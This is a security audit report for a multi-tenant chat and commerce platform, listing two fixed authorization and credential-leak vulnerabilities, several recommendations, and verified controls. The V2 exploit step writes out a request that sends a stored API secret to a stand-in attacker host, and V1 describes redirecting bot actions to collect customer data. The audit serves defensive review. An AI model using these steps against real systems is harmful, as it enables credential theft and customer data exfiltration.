# Security audit — 2026-11-12

Whole-product, read-only review of the platform at commit `109e29fe` (branch `fix/site-channels-demo-h1`).
Focus: customer data (contacts, conversations, phones), user accounts, products/orders, revenue/billing,
and platform assets (LLM provider keys, hermes sidecar, stored third-party credentials).

## Method

Five parallel audits, each read-only:

| Area | Scope |
|------|-------|
| Tenant isolation & authorization | `workspace_id` scoping, RLS, IDOR, roles/capabilities, back-office, jobs |
| Authentication & sessions | login, JWT, refresh, MFA, invitations, OAuth connect, API keys, CORS, secrets |
| Public ingress | webhooks (Meta, KiotViet), webchat public API, widget/dashboard XSS, realtime |
| AI / LLM assets | provider keys, hermes, bot tool calls, assistant SQL lane, SSRF, caches, tracing |
| Revenue, billing & storage | plans/ledger, payments, commerce prices, data export, S3 uploads, logs, committed secrets |

Every candidate finding was then re-checked by an independent agent that tried to disprove it.
Only findings with confidence ≥ 8/10 are listed as vulnerabilities. Lower-confidence or
documented-by-design items are listed as recommendations.

Excluded by scope: DoS, rate limiting, cost exhaustion, outdated dependencies, test-only code.

## Summary

| ID | Title | Severity | Confidence | Status |
|----|-------|----------|------------|--------|
| V1 | Bot API-action routes have no capability check | High | 9/10 | Fixed |
| V2 | Stored action secret can be sent to a caller-chosen host | High (with V1) / Medium (alone) | 9/10 | Fixed |
| R1 | Catalog image downloader: DNS-rebinding SSRF and blocklist gaps | Medium | 7/10 | Recommendation |
| R2 | Assistant SQL role can call `set_config` to override its RLS scope | Defense in depth | 2/10 exploitable today | Recommendation |
| R3 | `trustProxy: true` lets clients choose the IP used by login limiters | Low (rate limiting) | — | Recommendation |
| R4 | Access tokens stay valid up to 15 min after logout / password reset | Low | 5/10 | Recommendation |
| R5 | Plan entitlements (`ai.models.allowed`, `feature.*`) are not enforced | Informational (business) | 8/10 that the gap exists | Product decision |
| R6 | Signup-code request reveals whether an email is registered | Low | — | Recommendation |

No cross-tenant data access was found. No vulnerability was found in public ingress, authentication,
LLM key handling, data export or uploads.

---

## Vulnerabilities

### V1 — Bot API-action routes have no capability check

- **Where:** `apps/backend/src/modules/bot/interface/http/action.controller.ts:28-117`
- **Category:** broken function-level authorization (privilege escalation inside a workspace)
- **Severity:** High · **Confidence:** 9/10 (independently verified)

The controller only has `@WorkspaceScoped()`. None of its seven routes (`GET/POST /bots/:botId/actions`,
`POST /bots/:botId/actions/test`, `GET/PATCH/DELETE /bots/:botId/actions/:actionId`,
`POST /bots/:botId/actions/:actionId/test`) declares `@RequireCapability`. The `AuthGuard`
(`identity/interface/http/auth.guard.ts:88-94`) only enforces a capability when metadata is present, and the
action facade performs no role check — `bots.getBot(ws, botId)` is a tenant check only.
Sibling controllers (`bot.controller.ts`, `training.controller.ts`, `media.controller.ts`) require `bots.manage`,
which `ROLE_CAPABILITIES` (`packages/contracts/src/workspace/access.schema.ts:61-67`) grants only to owner and admin.

Actions are live: `ai/application/playground.service.ts:300` loads them as model tools for real replies, and
`ai/application/action-tools.ts:236` invokes them with arguments built from the customer conversation.

**Exploit.** A member with the `analyst`, `sales` or `care` role:
1. `POST /bots/{botId}/actions` with an action pointing at their own HTTPS server, or `PATCH` an existing action's
   URL. The bot then sends customer data collected in chats (name, phone, address, order details) to that server.
2. `DELETE` or disable the owner's actions to break the bot.
3. Steal stored third-party credentials (V2).

**Fix.** Add `@RequireCapability('bots.manage')` at class level on `ActionController`. Add a contract/HTTP test
asserting that every non-GET workspace route declares a capability, so a new controller cannot skip it.

**Status: fixed.** `ActionController` requires `bots.manage` at class level; `apps/backend/test/bot-actions-http.spec.ts`
asserts 403 for `sales`, `care` and `analyst` on all seven routes. The web app hides **Hành động API** and gates its pages
for those roles. The generic "every route declares a capability" test is still open.

### V2 — Stored action secret can be sent to a caller-chosen host

- **Where:** `apps/backend/src/modules/action/application/action.facade.impl.ts:148-171` (`testDraft`) and `:91-111` (`update`);
  `action/application/action-runner.ts:34-40`; `action/domain/build-request.ts:110-117`
- **Category:** credential disclosure / confused deputy
- **Severity:** High combined with V1 (any member); Medium alone (owner/admin can recover a write-only secret)
- **Confidence:** 9/10 (independently verified)

`testDraft` takes the full action definition — URL, method, auth kind, header name — from the request body.
When the body has no `authSecret` and carries an `actionId`, it copies the stored `authSecretEnc` of that action
into the draft. `ActionRunner` decrypts it and `build-request.ts` sends it as `Authorization: Bearer <secret>` or in
a header whose name the caller chooses. Nothing compares the draft URL with the stored action's URL. The SSRF guard
(`domain/ip-guard.ts`) blocks only private addresses; a public attacker host passes. `testDraft` writes no
`action_runs` row, so the leak leaves no trace.

`update` has the same flaw: when `url` changes and `authSecret` is omitted, the existing secret is kept, so the next
test or the next live conversation sends it to the new host.

The secret is write-only by design (`toDto` returns only `hasSecret`; ADR-024), so this breaks that guarantee.

**Exploit.**
1. `GET /bots/{botId}/actions` → note an action id with `hasSecret: true`.
2. `POST /bots/{botId}/actions/test` with
   `{ "actionId": "<id>", "action": { "url": "https://attacker.example/x", "auth": { "kind": "header", "headerName": "X-Leak" }, ... }, "args": {} }`.
3. The attacker's server receives the shop's plaintext API key (ERP/CRM/booking).

**Fix.**
- Reuse a stored secret only when the draft's origin (scheme + host + port) **and** auth kind/header name equal the
  stored action's; otherwise require the secret to be entered again.
- In `update`, clear `authSecretEnc` when the origin or auth target changes, unless a new secret is supplied.
- Fixing V1 reduces the attacker set to owner/admin but does not remove this issue.

**Status: fixed.** `sameSecretTarget` in `action.facade.impl.ts`: `testDraft` borrows the stored secret only for the same
origin and auth kind/header name, and `update` refuses (400 `secret_required`) a change of either without a new secret
or an explicit clear. A `{param}` in the URL host would let call arguments choose the destination, so the contract refuses
placeholders in the authority and `buildRequest` refuses any stored URL that still has one. Covered by
`action.facade.spec.ts`, `build-request.spec.ts` and `action.schema.test.ts`.

---

## Recommendations

### R1 — Catalog image downloader: DNS-rebinding SSRF and blocklist gaps (Medium, 7/10)

`apps/backend/src/modules/commerce/infrastructure/image-import/download-image.ts:73-86` checks `dns.lookup` results,
then the global `fetch` at `:123` resolves the host again; the socket is not pinned. Redirect hops (max 3) have the same gap.
http is allowed on any port. The blocklist (`:33-70`) misses `192.0.0.0/24` (Oracle Cloud metadata `192.0.0.192`),
`198.18.0.0/15`, `224.0.0.0/4`, `240.0.0.0/4`, and on IPv6 `64:ff9b::/96`, IPv4-compatible `::a.b.c.d`, `2002::/16`, `2001::/32`.

Path: KiotViet product image URL → `integration/application/catalog-writer.ts:143` →
`commerce/application/catalog-sync.service.ts:209-210` → `downloadExternalImage`. A tenant controlling a product image URL
and a rebinding DNS name can make the worker GET internal addresses (mostly blind; valid image responses end up in the
tenant's public bucket). Not confirmed: whether KiotViet accepts arbitrary image URLs.

**Fix.** Reuse `createSafeHttp` / `isPublicAddress` from `action/domain` (pinned lookup, IPv6 `2000::/3` allowlist); require https or port 443.

### R2 — Assistant SQL role can override its RLS scope (defense in depth)

The assistant SQL-lane RLS policies (`packages/db/migrations/0060_assistant_sql.sql:90-116`, also `0064`) read
`current_setting('app.account_id')` and `current_setting('app.assistant_business_ids')`. The assistant login can call
`set_config` (default PostgreSQL privilege), so the lexer guard in `assistant/domain/sql-guard.ts` is the only control
preventing a cross-account read. No guard bypass was found. The migration comment claiming RLS holds without the guard is wrong.

**Fix.** `REVOKE EXECUTE ON FUNCTION pg_catalog.set_config FROM` the assistant role, or have the policies read scope through a
`SECURITY DEFINER` function. At minimum, correct the comment.

### R3 — Client-controlled IP in login limiters

`apps/backend/src/bootstrap.ts:36` sets `trustProxy: true`; behind NPM → Caddy, `req.ip` is likely the left-most
`X-Forwarded-For` entry. Every attempt-limiter key includes the IP, and the login key uses the non-normalized email, so
password guessing against one account is effectively unlimited. Email codes and TOTP remain capped per code/user.

**Fix.** Set `trustProxy` to the hop count or proxy CIDRs; key the login limiter on the normalized email alone (plus IP as a second limiter).

### R4 — Access tokens outlive revocation

`identity/interface/http/auth.guard.ts:54-60` validates the JWT but not the session row. After logout, password reset or
enabling MFA, an issued access token stays valid up to 15 min (plus up to 10 min for a delegated token). In that window a stolen
owner/admin token can create an API key, which survives the password reset.

**Fix.** Check `sessions.revokedAt` in the guard (or a small revocation cache); require recent authentication to create API keys;
consider revoking a user's API keys on password reset.

### R5 — Plan entitlements not enforced (product decision)

`modelTier` (`packages/contracts/src/bot/bot.schema.ts:32`) is used as-is for replies
(`ai/application/playground.service.ts:497,510,560,623`); `entitlements.aiModels`
(`billing/domain/entitlements.ts:58`) is never read. `feature.website_widget`, `feature.lazada` and
`feature.facebook_posts` gate nothing; the `@RequiresFeature` guard described in `docs/08-billing-quota-credit.md:50` does not exist.
`docs/08-billing-quota-credit.md:74` records this as not yet enforced, so it is not a vulnerability, but the public plans advertise
these limits. Replies are metered per message regardless of tier, so the impact is model cost, not unlimited service.

**Decide before launch:** clamp/reject `modelTier ∉ aiModels` on save and at reply time; gate website/Lazada/fanpage-posts
connection on the matching `feature.*` flag (as `developer-plan-gate.ts` does for `feature.public_api`); fix `docs/08:50`.

### R6 — Account enumeration on signup

Requesting a signup code returns `EmailTakenError` for registered emails (`identity` `auth.handlers.ts:59`). Login and
forgot-password do not reveal it. Low impact; return a uniform response if this matters.

### Operational note

During the audit a live Claude Code OAuth token was found in an **uncommitted** change to the tracked file
`.claude/settings.json`. It is not in git history. Keep such tokens in `.claude/settings.local.json` (git-ignored) or the
environment, and rotate the token if it may have been exposed.

---

## Controls verified

**Tenant isolation.** `AuthGuard` resolves `X-Workspace-Id` against an active membership in a non-deleted workspace (404 otherwise);
the role comes from the DB. `withTenant` sets and verifies `app.workspace_id`; FORCE RLS is on every workspace table, asserted by
`packages/db/src/tenant.integration.test.ts:130`; repositories also filter by `workspace_id`. `withSystem` uses are limited to worker
leases and lookups by unguessable token/hash. BullMQ payloads require `workspaceId` and handlers run under `withTenant`.
Sales/care roles see only their own and unassigned contacts in CRM and analytics.

**Authentication.** EdDSA-only JWT with pinned issuer/audience and expiry; production refuses to start without keys. Refresh tokens
are 32 random bytes stored hashed, rotated on every use with family revocation on reuse; HttpOnly, SameSite=Lax, Secure cookie with
origin check. Argon2id passwords with constant-time unknown-email path. Email codes: 6 digits, hashed, 15 min, 5 attempts, single use.
TOTP with replay protection, sealed secret, hashed recovery codes. Invitations: 32 bytes hashed, 7 days, email must match.

**API keys.** ~190-bit keys stored as SHA-256 with constant-time compare; rights = scopes ∩ creator's current role; creator membership
re-checked per call; only routes marked `apiKey: true`; `members.manage`, `settings.manage`, `developer.manage`, `audit`, `data.export`
never grantable.

**Platform admin.** `@PlatformAdmin()` on every back-office controller; `is_platform_admin` read from the DB per request and set only
from the CLI; no default admin; no impersonation.

**Public ingress.** Meta webhooks: HMAC-SHA256 over the raw body, strict format, `timingSafeEqual`, empty secret rejected; verify-token
handshake constant-time, numeric challenge only. KiotViet: random path token, per-connection HMAC checked in the worker, orders re-read
from KiotViet. No Zalo/Telegram/payment webhooks exist yet. Realtime entry registers nothing.

**Webchat and widget.** Visitor token is HMAC-signed per site; history keyed by (workspace, connection, visitorId); no client-chosen
workspace/bot id; origin checked server-side; responses never include the phone number. Widget renders with `textContent` only; images
http(s) only; links same-origin only. Dashboard: React text rendering; the only `dangerouslySetInnerHTML` is static chart CSS;
assistant markdown links only to app-internal paths.

**AI assets.** LLM provider keys are platform-admin only, sealed with AES-256-GCM (random IV, key from `SECRETS_ENCRYPTION_KEY`, required in
production), never returned; changing `baseUrl` clears the key. No per-workspace BYO keys. Hermes: loopback/no published port, ≥32-char
bridge key with constant-time check, no tool execution, no pickle/yaml/eval, fixed upstream endpoints, no request logging. Customer-chat
tools take workspace, bot, scope and conversation from server context; confirm tools run only server-stored drafts; prices computed
server-side. Bot HTTP actions: https only, pinned DNS, public-address allowlist, no redirects, encoded path values, reserved headers refused.
No pgvector queries, no cross-tenant caches, no Langfuse integration.

**Revenue and billing.** Tenants have no write path to plans, credits or trials (admin-only). Payments are VietQR with manual admin
confirmation; no provider callbacks to forge. Reply metering is idempotent per key. Bot orders take catalog prices, qty 1–99, staff review.

**Data and storage.** Data export: `data.export` only (owner/admin), per-table RLS + `workspace_id` filter, private bucket, one-time hashed
5-minute download token, CSV formula escaping. Uploads: type from magic bytes (jpeg/png/webp/gif/mp4; no SVG/HTML), server-set content type,
keys `prefix/<ws>/<uuid>.<ext>`, `/media` GET/HEAD only with `nosniff`. Email templates from i18n with full escaping.

**Logs and secrets.** Request logs record the route template, not the URL; webchat masks phone/email; KiotViet token and bodies kept out of
logs. No secrets in tracked files besides `.env.example` placeholders; CI uses `secrets.*`.
